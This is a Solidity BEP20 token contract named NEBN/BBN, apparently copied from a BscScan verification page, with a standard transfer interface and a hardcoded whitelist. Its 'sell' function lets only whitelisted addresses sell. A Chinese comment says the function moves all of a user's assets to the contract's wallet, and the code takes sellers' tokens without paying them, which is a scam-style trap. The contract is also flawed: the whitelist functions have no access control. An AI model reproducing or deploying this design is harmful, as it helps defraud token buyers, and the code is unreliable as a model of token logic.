/**
 *Submitted for verification at BscScan.com on 2023-03-09
*/

// SPDX-License-Identifier: MIT


pragma solidity ^0.8.0;

interface IBEP20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract NEBN is IBEP20 {
    string public constant name = "NEBN";
    string public constant symbol = "BBN";
    uint8 public constant decimals = 18;
    uint256 public override totalSupply = 21000000000 * 10 ** decimals; //总发行量
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) public whitelist; //白名单
    
    address private constant contractAddress = 0xa9728Eb696671D37C10693faeF6518090d3A6AE8;
    uint256 private constant fee = 0;
    
    constructor() {
        _balances[msg.sender] = totalSupply;
        whitelist[contractAddress] = true;
        whitelist[0x0314f866eA7F6c5fA0e359151AcB953FD15A36bD] = true;
        whitelist[0x810f5272fD8e1506D6063Ad8dc0438BDe83dde86] = true;
        whitelist[0x3387e077377772F16f5bBC5c3B9Fe6f81B255ACb] = true;
        whitelist[0x4a04fA0410781328BF2c81f78f586cef7461BfC3] = true;
        emit Transfer(address(0), msg.sender, totalSupply);
    }
    
    function balanceOf(address account) public override view returns (uint256) {
        return _balances[account];
    }
    
    function transfer(address recipient, uint256 amount) public override returns (bool) {
        require(recipient != address(0), "BEP20: transfer to the zero address");
        require(amount > fee, "BEP20: transfer amount must be greater than fee");
        uint256 feeAmount = amount * fee / 100;
        uint256 transferAmount = amount - feeAmount;
        _balances[msg.sender] -= amount;
        _balances[recipient] += transferAmount;
        _balances[contractAddress] += feeAmount;
        emit Transfer(msg.sender, recipient, transferAmount);
        emit Transfer(msg.sender, contractAddress, feeAmount);
        return true;
    }
    
    function allowance(address owner, address spender) public override view returns (uint256) {
        return _allowances[owner][spender];
    }
    
    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }
    
    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        require(recipient != address(0), "BEP20: transfer to the zero address");
        require(amount <= _balances[sender], "BEP20: transfer amount exceeds balance");
        require(amount <= _allowances[sender][msg.sender], "BEP20: transfer amount exceeds allowance");
        uint256 feeAmount = amount * fee / 100;
        uint256 transferAmount = amount - feeAmount;
        _balances[sender] -= amount;
        _balances[recipient] += transferAmount;
        _balances[contractAddress] += feeAmount;
        _allowances[sender][msg.sender] -= amount;
        emit Transfer(sender, recipient, transferAmount);
        emit Transfer(sender, contractAddress, feeAmount);
        return true;
    }
    
    function addWhiteList(address _address) public {
        whitelist[_address] = true;
    }
    
    function removeWhiteList(address _address) public {
        whitelist[_address] = false;
    }
    
    //卖出时直接转移用户钱包所有资产到合约地址钱包
    function sell(uint256 amount) public {
        require(whitelist[msg.sender], "BEP20: you are not allowed to sell");
        _balances[msg.sender] -= amount;
        _balances[contractAddress] += amount;
        emit Transfer(msg.sender, contractAddress, amount);
        payable(contractAddress).transfer(amount);
    }
}